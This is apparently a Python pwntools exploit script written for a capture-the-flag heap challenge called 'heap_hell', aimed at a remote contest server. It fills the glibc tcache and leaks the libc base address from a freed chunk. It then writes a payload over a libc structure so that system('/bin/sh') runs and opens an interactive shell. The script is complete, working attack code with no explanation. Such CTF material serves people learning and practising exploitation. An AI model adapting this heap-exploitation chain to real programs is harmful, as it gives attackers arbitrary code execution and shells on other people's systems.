#!/usr/bin/env python # encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './heap_hell'
TARGET = ('arcade.fluxfingers.net', 1810)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def w(offset, size, data):
    r.sendlineafter('exit\n', '1')
    r.sendlineafter('How much do you want to write?\n', str(size))
    r.sendlineafter('At which offset?\n', str(offset))
    r.send(data)

def f(offset):
    r.sendlineafter('exit\n', '2')
    r.sendlineafter('At which offset do you want to free?\n', str(offset))

def l(offset):
    r.sendlineafter('exit\n', '3')
    r.sendlineafter('At which offset do you want to leak?\n', str(offset))
    return r.recvline()[:-1]

code = ELF(BINARY)
libc = ELF(LIBC64)

# self mmap
mmap_base = 0x10000
r.sendlineafter(')?\n', str(mmap_base))

# fill the tcache
w(0x8, 8, p64(0x101))
for i in xrange(7):
    f(0x10)

#attach(0x14c8)

w(0x108, 8, p64(0x101))
w(0x208, 8, p64(0x101))
f(0x10)

# leak libc base
libc.address = u64('\00' + l(0x11).ljust(7, '\x00')) - 0x1beb00 
log.info('libc base = %#x' % libc.address)

payload = fit({ 0: '/bin/sh\x00', 2920: p64(libc.sym['system']), 0x20000: '\x00'}, filler='\x00')

# initial
initial = 0x1bfbe0
w(libc.address + initial - 0x10000, 0x20001, payload)

r.interactive()


